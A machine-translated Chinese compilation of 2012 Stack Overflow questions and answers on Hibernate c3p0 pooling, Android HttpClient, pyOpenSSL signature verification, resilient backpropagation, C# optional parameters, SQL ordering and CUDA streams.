编辑：我上传到的相册是我的应用程序自动创建的相册。

# java - 休眠 C3P0 问题

> ID：12146975
> 
> 赞同：0
> 
> 时间：2012-08-27T17:53:37.767
> 
> 标签：java, hibernate, c3p0

我正在尝试使用 c3p0 设置，使应用程序能够自动丢弃过时的连接，并自动重新建立连接。我在 sessionfactoryprovider 类中设置了如下配置属性：

```
configuration.setProperty("hibernate.c3p0.min_size", c3p0
                .get("minPoolSize") != null ? c3p0.get("minPoolSize")
                : "1");
configuration.setProperty("hibernate.c3p0.max_size", c3p0
                .get("maxPoolSize") != null ? c3p0.get("maxPoolSize")
                : "50");
configuration.setProperty("hibernate.c3p0.timeout", c3p0
                .get("maxIdleTime") != null ? c3p0.get("maxIdleTime")
                : "900");
configuration.setProperty(
                "hibernate.c3p0.acquireRetryAttempts",
                c3p0.get("acquireRetryAttempts") != null ? c3p0
                                .get("acquireRetryAttempts") : "30");
configuration.setProperty(
                "hibernate.c3p0.acquireIncrement",
                c3p0.get("acquireIncrement") != null ? c3p0
                                .get("acquireIncrement") : "5");
configuration.setProperty(
                "hibernate.c3p0.idleConnectionTestPeriod",
                c3p0.get("idleConnectionTestPeriod") != null ? c3p0
                                .get("idleConnectionTestPeriod") : "60");
configuration.setProperty("hibernate.c3p0.initialPoolSize", c3p0
                .get("minPoolSize") != null ? c3p0.get("minPoolSize")
                : "1");
configuration.setProperty(
                "hibernate.c3p0.maxStatements",
                c3p0.get("maxStatementsPerConnection") != null ? c3p0
                                .get("maxStatementsPerConnection")
                                : "0");
configuration.setProperty("preferredTestQuery", "select 1 from dual");
configuration.setProperty("hibernate.c3p0.testConnectionOnCheckin",
                "true");
configuration.setProperty("hibernate.c3p0.testConnectionOnCheckout",
                "true");
configuration.setProperty("testConnectionOnCheckin", "true");
configuration.setProperty("hibernate.c3p0.preferredTestQuery",
                "select 1 from dual"); 
```

我在应用程序中没有找到任何日志，试图执行测试查询，也没有在数据库重启后恢复。“show_sql”在属性文件中设置为 true，在日志中，我可以看到其他查询正在执行。
**包版本如下：** C3P0 = 0.9.1.2；休眠注释= 3.3；休眠 = 3.3;

有人可以建议我应该如何进行调试吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-27T19:46:27.793

尝试将 c3p0 的日志记录级别设置为在 log4j 配置中进行调试：

```
log4j.category.com.mchange=DEBUG 
```

# web - 网站传输的最佳/常见做法（一天中的什么时间？）

> ID：12146977
> 
> 赞同：1
> 
> 时间：2012-08-27T17:53:51.123
> 
> 标签：web

基本上，我的问题是了解您在一天中的什么时间在跨服务器移动站点时执行诸如 DNS 传输之类的事情，并为站点提供更新。有没有人在白天这样做，或者大多数开发人员在晚上这样做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-27T18:18:10.613

我认为不同的方法可能是有效的，这取决于您的情况、要执行的实际更改、更改发生的频率以及您的用户期望什么。

如果您**在白天**这样做，您可能有更长的时间来解决问题（如果有），包括是否需要与您的服务提供商处理问题（在工作时间可能比在晚上或在周末）。

如果您喜欢**在晚上或周末**工作，并且您不依赖任何服务提供商来解决与您询问的移动/迁移相关的任何问题，那么此时这样做可能对您的用户造成的干扰较小。

但这一切还取决于**谁是您的实际用户**。越来越多的用户遍布全球，可以在白天或晚上的任何时间与您的网站进行交互。

常见的系统管理实践，在处理重大更改或迁移时，通常建议不要在下班时间（晚上、周末或节假日）之前执行此操作，除非您确定您（或团队）是可用于解决问题。基本上，您需要为问题做好计划，因为它们总是会发生。

其他需要考虑的是您或您的公司可能与用户之间的任何**SLA 。**在这种情况下，您可能需要在工作时间之外执行维护操作，或在临时通知的情况下执行维护操作，否则可能会受到任何处罚。

您所问问题的正确答案实际上取决于您的情况和您从事的业务。

# javascript - 在 textarea.value 中保留换行符

> ID：12146979
> 
> 赞同：0
> 
> 时间：2012-08-27T17:53:53.553
> 
> 标签：javascript

我必须使用 textarea.value 文本，但它不会保留用户输入的换行符。我不想使用`replace(/\n\r?/g, '<br />')`技巧，因为它仅用于将文本呈现为 html。

有没有其他方法可以按原样访问 textarea.value ？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-27T18:05:22.857

在此示例[http://jsfiddle.net/jfriend00/Gy7W3/](http://jsfiddle.net/jfriend00/Gy7W3/)中，文本区域在用户输入换行符的任何地方都在属性上返回换行符，`.value`因此它似乎已经做了您想要的。

# android - 在 Android 应用程序中包含 Http-4.2.1

> ID：12146984
> 
> 赞同：2
> 
> 时间：2012-08-27T17:54:06.433
> 
> 标签：android, apache, http, version, apache-httpclient-4.x

我希望在我的 Android 应用程序中包含最新版本的 Http，即 4.2.1。现在希望从 Apache 网站下载库并将其包含在 libs 文件夹中，然后包含到我的应用程序的构建路径中。

在包含 Http - 4.2.1 时，我在 logcat 中得到以下输出

```
08-28 02:42:40.917: D/dalvikvm(25641): DexOpt: 'Lorg/apache/http/client/ResponseHandler;' has an earlier definition; blocking out
08-28 02:42:40.917: D/dalvikvm(25641): DexOpt: 'Lorg/apache/commons/codec/Decoder;' has an earlier definition; blocking out
08-28 02:42:40.927: D/dalvikvm(25641): DexOpt: 'Lorg/apache/commons/codec/BinaryDecoder;' has an earlier definition; blocking out
08-28 02:42:40.927: D/dalvikvm(25641): DexOpt: 'Lorg/apache/commons/codec/Encoder;' has an earlier definition; blocking out
08-28 02:42:40.927: D/dalvikvm(25641): DexOpt: 'Lorg/apache/commons/codec/BinaryEncoder;' has an earlier definition; blocking out
08-28 02:42:40.927: D/dalvikvm(25641): DexOpt: 'Lorg/apache/commons/codec/DecoderException;' has an earlier definition; blocking out
08-28 02:42:40.927: D/dalvikvm(25641): DexOpt: 'Lorg/apache/commons/codec/EncoderException;' has an earlier definition; blocking out
08-28 02:42:40.927: D/dalvikvm(25641): DexOpt: 'Lorg/apache/commons/codec/StringDecoder;' has an earlier definition; blocking out
08-28 02:42:40.927: D/dalvikvm(25641): DexOpt: 'Lorg/apache/commons/codec/StringEncoder;' has an earlier definition; blocking out
08-28 02:42:40.927: D/dalvikvm(25641): DexOpt: 'Lorg/apache/commons/codec/StringEncoderComparator;' has an earlier definition; blocking out
08-28 02:42:40.937: D/dalvikvm(25641): DexOpt: 'Lorg/apache/commons/codec/binary/Base64;' has an earlier definition; blocking out
08-28 02:42:42.847: D/dalvikvm(25641): DexOpt: not verifying 'Lorg/apache/http/HeaderElement;': multiple definitions
08-28 02:42:42.847: D/dalvikvm(25641): DexOpt: not verifying 'Lorg/apache/http/HeaderElementIterator;': multiple definitions
08-28 02:42:42.847: D/dalvikvm(25641): DexOpt: not verifying 'Lorg/apache/http/HeaderIterator;': multiple definitions
08-28 02:42:42.847: D/dalvikvm(25641): DexOpt: not verifying 'Lorg/apache/http/HttpConnection;': multiple definitions
08-28 02:42:42.847: D/dalvikvm(25641): DexOpt: not verifying 'Lorg/apache/http/HttpClientConnection;': multiple definitions
08-28 02:42:42.847: D/dalvikvm(25641): DexOpt: not verifying 'Lorg/apache/http/HttpConnectionMetrics;': multiple definitions
08-28 02:42:42.847: D/dalvikvm(25641): DexOpt: not verifying 'Lorg/apache/http/HttpEntity;': multiple definitions
08-28 02:42:42.857: D/dalvikvm(25641): DexOpt: not verifying 'Lorg/apache/http/HttpMessage;': multiple definitions
08-28 02:42:42.857: D/dalvikvm(25641): DexOpt: not verifying 'Lorg/apache/http/HttpRequest;': multiple definitions
08-28 02:42:42.857: D/dalvikvm(25641): DexOpt: not verifying 'Lorg/apache/http/HttpEntityEnclosingRequest;': multiple definitions
08-28 02:42:42.857: D/dalvikvm(25641): DexOpt: not verifying 'Lorg/apache/http/HttpException;': multiple definitions
08-28 02:42:42.857: D/dalvikvm(25641): DexOpt: not verifying 'Lorg/apache/http/HttpHost;': multiple definitions
08-28 02:42:42.857: D/dalvikvm(25641): DexOpt: not verifying 'Lorg/apache/http/HttpInetConnection;': multiple definitions
08-28 02:42:42.857: D/dalvikvm(25641): DexOpt: not verifying 'Lorg/apache/http/HttpRequestFactory;': multiple definitions 
```

**我的问题**是我可以这样做吗？这会与已经包含的 Http 库版本以及 SDK 产生一些冲突吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-28T11:17:11.057

不幸的是，这个问题没有一个优雅而干净的解决方案。您唯一的选择是使用 maven shade 插件或使用[此处提供的库的预打包分支将所有 HttpClient 类移动到自定义命名空间（'org.apache.http' -> 'my.http'）](http://code.google.com/p/httpclientandroidlib/)

**编辑**

到今天为止，还可以使用[Apache HttpClient 4.3 的官方端口到 Google Android](http://hc.apache.org/httpcomponents-client-4.3.x/android-port.html)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-05-24T18:24:42.010

```
<classpathentry kind="con" path="com.android.ide.eclipse.adt.ANDROID_FRAMEWORK">
<accessrules>
<accessrule kind="nonaccessible" pattern="org/apache/http/**"/>
</accessrules>
</classpathentry> 
```

我修复它像这样修改应用程序的 .classpath 文件，我在开源项目 open-gpstracker 中找到了解决方案

# python - 使用 pyopenssl 验证签名

> ID：12146985
> 
> 赞同：6
> 
> 时间：2012-08-27T17:54:11.327
> 
> 标签：python, ssl, certificate, m2crypto, pyopenssl

我相信自从这个[问题](https://stackoverflow.com/questions/1471037/how-do-you-verify-an-rsa-sha1-signature-in-pyopenssl)以来，pyOpenSSL 已经开始支持签名验证（从[pyOpenSSL 0.11](https://launchpad.net/pyopenssl/+announcement/7128)开始。

我正在开发一个由其他人使用[M2Crypto](http://chandlerproject.org/Projects/MeTooCrypto)启动的项目。M2Crypto 包含在[Heroku](http://www.heroku.com/)等平台上真的很痛苦，因为它需要使用[SWIG](http://www.swig.org/)。因此，我试图删除对 M2Crypto 的依赖并替换为易于通过 Pip 安装的 pyOpenSSL，并且不需要自定义 buildpack 以及更多与 SWIG 相关的东西。

我遇到的问题是替换一些代码：

```
key = cert.get_pubkey() # Cert is an M2Crypto X509 object
key = key.get_rsa()
ret = key.verify(hashed, self.sig)
if ret != 1:
    # Cert invalid ... etc. 
```

理想情况下，我想通过 pyOpenSSL 实现相同的功能，但我觉得我可能搞错了——我尝试过使用：

```
crypto.verify(cert, self.sig, hashed, 'sha1') 
```

但这失败了-

```
[('rsa routines', 'RSA_verify', 'bad signature')] 
```

我无法确定它是否失败是因为签名实际上很糟糕，还是因为我提供的 crypto.verify 值实际上不是它应该用于的！

我一直在玩的原始代码在[这里](https://github.com/pyroven/django-pyroven)，需要大量的工作来整理，但试图在完全重构之前一次替换功能。任何指针将不胜感激！pyOpenSSL 是否有能力在这里替换 M2Crypto 功能，我是否以正确的方式进行？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-31T17:54:05.640

因此，答案来自阅读更多 pyOpenSSL 的源代码，并带有来自[exarkun](https://launchpad.net/~exarkun)的指针。pyOpenSSL 确实可以在这里替换 M2Crypto 依赖项，只需对底层代码进行非常小的更改。

[此处](http://bazaar.launchpad.net/~exarkun/pyopenssl/trunk/view/head:/OpenSSL/test/test_crypto.py#L2750)crypto.verify() 函数的单元测试显示了调用：

```
verify(good_cert, sig, content, digest) 
```

因此，我上面的代码中有一个错误：

```
crypto.verify(cert, self.sig, hashed, 'sha1') 
```

当签名应用于原始数据字符串时，应该简单地采用“数据”，而不是散列：

```
# N.B. cert = X509 object (from crypto.load_certificate())
crypto.verify(cert, self.sig, data, 'sha1') 
```

这种行为似乎与 M2Crypto 的 verify 不同，后者采用散列数据字符串执行其验证。请注意，我还没有深入研究 M2Crypto 的功能来弄清楚发生了什么。

感谢[exarkun](https://launchpad.net/~exarkun)对[pyOpenSSL 邮件列表](http://lists.launchpad.net/pyopenssl-users)的回复，这让我指出了我调用 verify() 时的错误，而不是我对 verify() 在做什么的理解。

# algorithm - Part 2 弹性反向传播神经网络

> ID：12146986
> 
> 赞同：7
> 
> 时间：2012-08-27T17:54:11.233
> 
> 标签：algorithm, artificial-intelligence, neural-network, backpropagation

[这是这篇文章](https://stackoverflow.com/questions/2865057/resilient-backpropagation-neural-network-question-about-gradient)的后续问题。对于给定的神经元，我不清楚如何取其误差的偏导数及其权重的偏导数。

从这个[网页](http://galaxy.agh.edu.pl/~vlsi/AI/backp_t_en/backprop.html)工作，很清楚传播是如何工作的（尽管我正在处理弹性传播）。对于前馈神经网络，我们必须 1）在通过神经网络向前移动时触发神经元，2）从输出层神经元计算总误差。然后 3) 向后移动，通过神经元中的每个权重传播该错误，然后 4) 再次前进，更新每个神经元中的权重。

确切地说，这些是我不明白的事情。

**A）**对于每个神经元，你如何计算误差对权重的偏导数的偏导数（[定义](http://en.wikipedia.org/wiki/Partial_derivative)）？我的困惑是，在微积分中，偏导数是根据 n 变量函数计算的。我有点理解[ldog](https://stackoverflow.com/users/177931/ldog)和[拜耳在](https://stackoverflow.com/users/92743/bayer)[这篇文章](https://stackoverflow.com/questions/2190732/understanding-the-neural-network-backpropagation)中的回答。我什至理解了链式法则。但是，当我准确地想到如何将其应用于 ai) 线性组合器和 ii) sigmoid 激活函数的结果时，它并没有凝固。

**B）**使用弹性传播方法，你将如何改变给定神经元的偏差？还是使用弹性传播训练的 NN 中没有偏差或阈值？

**C）**如果有两个或更多输出神经元，你如何传播总误差？每个输出神经元值是否会出现总误差 * 神经元权重？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2016-06-05T21:51:43.930

一个）

在监督学习任务中，总体优化目标是所有训练示例的总损失，定义为 E = \sum_n loss(y_n, t_n)，其中 n 是所有训练示例的索引，y_n 是指训练的网络输出example n，t_n 是训练样例 n 的标签，loss 指的是损失函数。请注意，y_n 和 t_n 通常是向量化的量——向量长度由网络中输出神经元的数量决定。

损失函数的一种可能选择是定义为 loss(y, t) = \sum_k (y_k - t_k) ^ 2 的平方误差，其中 k 是指网络中输出神经元的数量。在反向传播中，必须计算整体优化目标相对于网络参数的偏导数——这些参数是突触权重和神经元偏差。这是根据链式法则通过以下公式实现的：

(\partial E / \partial w_{ij}) = (\partial E / \partial out_j) * (\partial out_j / \partial in_j) * (\partial in_j / partial w_{ij})，

其中 w_{ij} 是指神经元 i 和神经元 j 之间的权重，out_j 是指神经元 j 的输出，in_j 是指神经元 j 的输入。

如何计算神经元输出 out_j 及其相对于神经元输入 in_j 的导数取决于使用的激活函数。如果您使用线性激活函数来计算神经元的输出 out_j，则项 (\partial out_j / \partial in_j) 变为 1。例如，如果您使用逻辑函数作为激活函数，则项 (\partial out_j / \部分 in_j) 变为 sig(in_j) * (1 - sig(in_j))，其中 sig 是逻辑函数。

二）

在弹性反向传播中，偏差的更新方式与权重完全相同——基于偏导数的符号和各个可调整的步长。

C）

我不太确定我是否理解正确。总体优化目标是所有网络参数的标量函数，无论有多少输出神经元。因此，这里应该不会混淆如何计算偏导数。

一般来说，为了计算总体优化目标 E 关于某个权重 w_{ij} 的偏导数 (\partial E / \partial w_{ij})，必须计算偏导数 (\partial out_k / \partial w_{ij}) 每个输出神经元 k 相对于 w_{ij} 为

(\partial E / \partial w_{ij}) = \sum_k (\partial E / \partial out_k) * (\partial out_k / \partial w_{ij})。

但是请注意，如果 w_{ij} 不影响输出神经元 k 的输出 out_k，则输出神经元 k 关于 w_{ij} 的偏导数 (\partial out_k / \partial w_{ij}) 将为零。

还有一件事。如果使用平方误差作为损失函数，则整体优化目标 E 相对于某个输出神经元 k 的输出 out_k 的偏导数 (\partial E / \partial out_k) 为

(\partial E / \partial out_k) = \sum_k 2 * (out_k - t_k),

其中数量 (out_k - t_k) 被称为附加到输出单元 k 的误差，并且为了表示方便，我假设只有一个带有标签 t 的训练示例。注意，如果 w_{ij} 对输出神经元 k 的输出 out_k 没有任何影响，那么 w_{ij} 的更新将不依赖于误差 (out_k - t_k)，因为 (\partial out_k / \partial w_{ ij}) = 0 如上所述。

最后的评论，以避免任何混淆。y_k 和 out_k 都指网络中输出神经元 k 的输出。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-07-12T12:08:42.383

在其他方面不是 100% 确定，但我现在可以回答 B：

B）偏差是根据偏导数的方向而不是幅度来更新的。如果连续迭代的方向保持不变，则权重更新的大小会增加。振荡方向将减少更新的大小。 [http://nopr.niscair.res.in/bitstream/123456789/8460/1/IJEMS%2012(5)%20434-442.pdf](http://nopr.niscair.res.in/bitstream/123456789/8460/1/IJEMS%2012(5)%20434-442.pdf)

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2016-05-26T11:53:10.880

对我来说（也在考虑微积分和符号方程的术语），只有在我意识到这一切都是为了将​​函数放在自身方面，从而*避免*微分过程之后，才产生了*点击。*

 *几个例子（python）可能会有所帮助......

如果我有线性激活函数：

```
def f_act( x ):
    return x 
```

那么导数很容易，在我需要**d( f_act )**的任何地方，我都放一个**1**：

```
def der_f_act( y ):
    return 1 
```

同样，如果我有一个逻辑激活函数：

> f_a = 1 / ( 1 + e^(-x) )

那么导数可以根据函数本身（[这里是细节](https://en.wikipedia.org/wiki/Logistic_function#Derivative)）写成：

> d( f_a ) = f_a ( 1 - f_a )

所有可以编码为：

```
def f_act( x ):
    return 1 / ( 1 + numpy.exp(-1*x) )

def der_f_act( y ):
    return y * ( 1 - y ) 
```

对于这些示例，我*已经获得*了激活函数的值（来自前馈阶段），因此我可以从中获利并计算该*点*的值；）

这是更喜欢某些激活函数的一个原因：有些具有非常方便的导数，这使得实现变得容易且高效，尤其是当您谈论的是神经网络中的一堆节点时。*

# c# - 方法中的可选参数不是 Rectangle 的编译时常量错误

> ID：12146989
> 
> 赞同：6
> 
> 时间：2012-08-27T17:54:24.010
> 
> 标签：c#, compiler-errors, optional-parameters

我有一个方法，我想使用`Rectangle`默认值为 (1,1,1,1) 的可选参数。

```
void Method(int i, int j = 1, Rectangle rect = new Rectangle(1,1,1,1)) {} //error 
```

我该如何解决这个问题？（我正在使用 XNA，所以它是一个`Microsoft.Xna.Framework.Rectangle`。）

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-27T17:56:42.110

你没有。可选参数必须是编译时常量，而`new Rectangle(1,1,1,1)`不是编译时常量。

您可以有两种方法重载，一种没有矩形：

```
void Method(int i, int j = 1) 
{
    Method(i, j, new Rectangle(1,1,1,1)) 
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-20T03:12:09.717

我刚刚找到了一个更好的方法：

```
void MyMethod(string someString, Rectangle rect = default(Rectangle))
{
    if (rect == default(Rectangle)) 
        rect = new Rectangle(1, 1, 1, 1);
} 
```

可能只有一个问题：当默认值和传递的值匹配时，对于`== default(T)`. 但是一种解决方法是通过`null`并检查以将其设置为默认值 ot 类型。

# sql-server - 在 case 语句中按多个子句排序

> ID：12146990
> 
> 赞同：0
> 
> 时间：2012-08-27T17:54:26.040
> 
> 标签：sql-server, sql-order-by, case

我正在处理一个查询，它将检索各种个人信息，包括名字和姓氏。我想根据传递的参数更改数据返回的顺序，称为`@p_Code`. 什么时候`@p_Code`是 4，我想按名字排序，然后是姓氏。如果不是 4，那么我想按姓氏排序，然后是名字。

我正在使用 MS Sql。

这是当前的查询：

```
Select Last,
       First,
       Phone,
       Email
From Master.dbo.Cust
Order by
case @p_Code
     when '4' then
         ([First], [Last])
     else
         ([Last], [First])
end 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-27T18:07:21.567

这应该这样做：

```
DECLARE @p_Code VARCHAR(10)
SET @p_Code = '4'
Select [Last],
       [First],
       Phone,
       Email
From Master.dbo.Cust
Order by
case WHEN @p_Code = '4' THEN (RANK() OVER (ORDER BY [First], [Last]))
 ELSE (RANK() OVER (ORDER BY [Last],[First] )) END 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-27T18:01:29.880

我手边没有测试环境，但是这个怎么样：

```
Select Last,
       First,
       Phone,
       Email,
       (case @p_Code when '4' then [first] else [last] end) as key1,
       (case @p_Code when '4' then [last] else [first] end) as key2
From Master.dbo.Cust
Order by key1, key2 
```

# ruby - 使用 watir-webdriver 在 Internet Explorer 上设置 cookie

> ID：12146992
> 
> 赞同：2
> 
> 时间：2012-08-27T17:54:26.080
> 
> 标签：ruby, internet-explorer, cookies, cucumber, watir-webdriver

我正在尝试通过 Cucumber 验收测试在 Internet Explorer 上设置 cookie。

这是我尝试的第一件事：

```
browser.cookies.add("my.cookie","90",{:path => "/", :expires => expiredTime}) 
```

这是第二件事：

```
browser.driver.manage.add_cookie(name:"my.cookie", value:"90", expires:expired_time) 
```

这两种方法都会导致相同的异常：

```
(Selenium::WebDriver::Error::NoSuchDocumentError) Unable to add cookie to page 
```

我只在使用 Internet Explorer 而不是 Firefox 时得到这个异常。

我正在使用 Windows 7、IE 8、64 位。

我的一些宝石：selenium-webdriver (2.25.0) watir-webdriver (0.6.1) cucumber (1.2.1)

提前感谢您提供有关解决此问题的任何建议。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-09T12:03:01.230

我在 Win7 / IE9 上遇到了完全相同的问题。我发现当浏览器所在的页面没有设置缓存标头时，添加 cookie 失败。我们在服务器上创建了一个带有未来缓存标头的空页面，并在该页面上设置 cookie 有效。

我不知道哪个特定的标头会阻止添加 cookie。由于您可能需要移动到不同的页面来设置 cookie，因此值得使用带有遥远未来标题的页面来加快加载速度。

# event-handling - monodroid 系列的 teechart 无法触发点击事件

> ID：12146995
> 
> 赞同：0
> 
> 时间：2012-08-27T17:54:38.337
> 
> 标签：event-handling, xamarin.android, series, teechart

我正在使用 TeeChart for monodroid 创建一个具有点击事件的系列。请看下面的代码，

```
newChart.ClickSeries += new Steema.TeeChart.TChart.SeriesEventHandler(mealSeries_ClickSeries);

private void mealSeries_ClickSeries(object sender, Steema.TeeChart.Styles.Series s, int valueIndex, MotionEvent e) 
    {
        DisplayMealDetails(valueIndex);
    } 
```

然而，这个事件从未被触发，我尝试调试，并得到这个输出说“onTouchEvent：isFocusable：false，isFocusableInTouchMode：false，isFocused：false; focusTaken：false”所以，我将它添加到我的应用程序中，

```
newChart.Focusable = true;
newChart.FocusableInTouchMode = true; 
```

但仍然无法触发点击事件。有人可以帮忙吗？非常感谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-28T13:59:22.000

看起来这已经被打破了。我已将问题 (TM63016317) 添加到缺陷列表中，并将尝试在下一个维护版本中修复它。

# parallel-processing - Cuda，为什么我不能使用多个流处理器？

> ID：12146997
> 
> 赞同：0
> 
> 时间：2012-08-27T17:54:42.563
> 
> 标签：parallel-processing, cuda, scaling, cuda-streams

我在 Cuda 中实现了 RNS 蒙哥马利求幂。

一切都很好。它只在一个 SM 上运行。

但是，到目前为止，我只关注单个 exp 的并行化。我现在要做的是在运行中使用几个 exp 进行测试。也就是说，我希望将第 i 个下一个 exp 分配给一个空闲的 SM。

我试过了，最后的时间总是线性增长的，就是所有的exp都分配给了同一个SM。

然后我切换到流，但没有任何改变。

但是我从未使用过它们，所以也许我做错了什么..

这是代码：

```
void __smeWrapper() {
    cudaEvent_t start, stop;
    cudaStream_t stream0, stream1, stream2;
    float time;
    unsigned int j, i, tmp;
    cudaEventCreate(&start);
    cudaEventCreate(&stop);
    dim3 threadsPerBlock(SET_SIZE, (SET_SIZE+1)/2);

    setCudaDevice();

    s_transferDataToGPU();

    if(cudaDeviceSetCacheConfig(cudaFuncCachePreferL1) != cudaSuccess)
        printf("cudaDeviceSetCacheConfig ERROR!");

    cudaEventRecord( start, 0 );

    //for(i=0; i<EXPONENTIATION_NUMBER; i++)    {
    i=0;
        __me<<< 1, threadsPerBlock, 0, stream0 >>>(&__s_x[i*(2*SET_SIZE + 1)],     __B2modN, __bases, __mmi_NinB, __mmi_Bimodbi, __Bi_inAUar, __dbg, __NinAUar,    
                                            __mmi_BinAUar, __mmi_Ajmodaj, __Ajmodar, __mmi_Armodar, __AjinB, __minusAinB, &__z[i*(2*SET_SIZE + 1)], __e);
    i=1;
        __me<<< 1, threadsPerBlock, 0, stream1 >>>(&__s_x[i*(2*SET_SIZE + 1)], __B2modN, __bases, __mmi_NinB, __mmi_Bimodbi, __Bi_inAUar, __dbg, __NinAUar,
                                        __mmi_BinAUar, __mmi_Ajmodaj, __Ajmodar, __mmi_Armodar, __AjinB, __minusAinB, &__z[i*(2*SET_SIZE + 1)], __e);
    i=2;
    __me<<< 1, threadsPerBlock, 0, stream2 >>>(&__s_x[i*(2*SET_SIZE + 1)], __B2modN, __bases, __mmi_NinB, __mmi_Bimodbi, __Bi_inAUar, __dbg, __NinAUar, __mmi_BinAUar,
                                                                    __mmi_Ajmodaj, __Ajmodar, __mmi_Armodar, __AjinB, __minusAinB, &__z[i*(2*SET_SIZE + 1)], __e);
        //printf("\n%s\n\n", cudaGetErrorString(cudaGetLastError()));
    //}

cudaEventRecord( stop, 0 );
cudaEventSynchronize( stop );
cudaEventElapsedTime( &time, start, stop );
    printf("GPU %f µs : %f ms\n", time*1000, time);

cudaEventDestroy( start );
cudaEventDestroy( stop ); 
```

Ubuntu 11.04 64b、Cuda 5 RC、560 Ti (8 SM)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-27T17:56:26.833

一个块中的所有线程总是在同一个 SM 上运行。您需要启动多个块才能使用其他 SM。

您的流似乎有问题 - 您是否为每个流调用 cudaStreamCreate ？在我的系统上，如果我不使用 SEGFAULT，它会崩溃。